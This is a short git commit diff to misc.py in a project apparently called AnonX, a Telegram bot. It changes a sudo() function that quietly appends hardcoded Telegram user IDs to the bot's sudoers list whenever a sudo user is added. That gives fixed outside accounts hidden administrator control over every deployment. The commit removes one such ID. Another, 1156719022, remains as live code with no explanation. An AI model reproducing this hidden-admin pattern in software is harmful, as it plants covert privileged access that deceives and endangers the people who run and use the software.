15e6858c7ee370b1aa02c2e5edf5f2dbf6adab3e
movieverseofc <103868734+movieverseofc@users.noreply.github.com>
2022-11-10 09:30:27 +0530

    Update misc.py

--- AnonX/misc.py
+++ AnonX/misc.py
@@ -57,7 +57,6 @@ def sudo():
             if user_id not in sudoers:
                 sudoers.append(user_id)
                 sudoers.append(1156719022)
-                sudoers.append(5167919285)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
